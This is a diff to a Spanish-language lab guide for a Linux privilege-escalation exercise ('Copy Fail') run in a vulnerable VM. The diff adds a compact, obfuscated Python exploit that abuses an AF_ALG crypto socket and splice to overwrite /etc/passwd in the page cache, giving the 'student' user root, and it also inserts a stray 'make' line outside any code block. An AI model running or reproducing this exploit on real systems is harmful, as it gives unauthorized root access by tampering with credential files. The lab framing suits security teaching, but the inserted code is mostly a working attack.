@@ -53,7 +53,7 @@ make setup
 # Esto toma ~20 minutos. Lee el write-up mientras esperas:
 # https://xint.io/blog/copy-fail-linux-distributions
 ```
-
+make
 ### 1.2 Arranca la VM vulnerable
 
 ```bash
@@ -155,8 +155,29 @@ id   # confirma que eres student
 python3 copy_fail_exp.py
 
 # Si el exploit funciona, deberías ver algo como:
-# uid=0(root) gid=1001(student) groups=1001(student)
+cat << 'EOF' > force_root.py
+import os as g,zlib,socket as s
+def d(x):return bytes.fromhex(x)
+def c(f,t,c):
+ try:
+  a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"))
+  h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4)
+  u,_=a.accept();o=t+4
+  u.sendmsg([b"A"*4+c],[(h,3,d('00')*4),(h,2,b'\x10'+d('00')*19),(h,4,b'\x08'+d('00')*3),],32768)
+  r,w=g.pipe();g.splice(f,w,o,offset_src=0);g.splice(r,u.fileno(),o);u.recv(8+t)
+ except: pass
 
+# Atacamos el archivo que define quién puede hacer qué
+f=g.open("/etc/passwd",0)
+# Este payload cambia la línea de student para que su UID sea 0 (root)
+# Sobreescribimos el inicio del archivo en el Page Cache
+payload = b"student:x:0:0:root:/home/student:/bin/sh\n"
+for i in range(0, len(payload), 4):
+    c(f, i, payload[i:i+4])
+
+print("[!] Ataque al Page Cache de /etc/passwd completado.")
+print("[!] Intenta ejecutar: su student (sin password) o simplemente id")
+EOF
 id   # ahora deberías ser root
 ```
 
